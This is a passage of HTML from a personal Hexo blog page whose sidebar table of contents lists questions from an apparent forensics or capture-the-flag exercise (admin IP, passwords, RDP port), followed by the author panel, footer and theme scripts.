class="nav-text">4、后台用户数为？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95IP%E6%98%AF%EF%BC%9F"><span class="nav-number">5.</span> <span class="nav-text">5、管理员登录IP是？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6%E3%80%81%E8%BF%90%E7%BB%B4%E4%BA%BA%E5%91%98%E7%9A%84%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E6%98%AF%EF%BC%9F"><span class="nav-number">6.</span> <span class="nav-text">6、运维人员的后台登录密码是？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7-sa-%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%AF%EF%BC%9F"><span class="nav-number">7.</span> <span class="nav-text">7、数据库用户 sa 的密码是？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8%E3%80%81%E7%94%A8%E6%88%B7administrator%E6%A1%8C%E9%9D%A2%E4%B8%8A%E7%9A%84flag-txt-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%86%85%E5%AE%B9%E6%98%AF%EF%BC%9F"><span class="nav-number">8.</span> <span class="nav-text">8、用户administrator桌面上的flag.txt 文件中的内容是？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9%E3%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%86%E7%A0%81%E6%98%AF%EF%BC%9F"><span class="nav-number">9.</span> <span class="nav-text">9、服务器密码是？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10%E3%80%81%E4%BF%AE%E6%94%B9%E8%BF%87%E7%9A%84RDP%E7%AB%AF%E5%8F%A3%E6%98%AF%EF%BC%9F"><span class="nav-number">10.</span> <span class="nav-text">10、修改过的RDP端口是？</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="jojo"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">jojo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">jojo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/qwe/anime.min.js"></script>
+  <script src="/qwe/velocity/velocity.min.js"></script>
+  <script src="/qwe/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
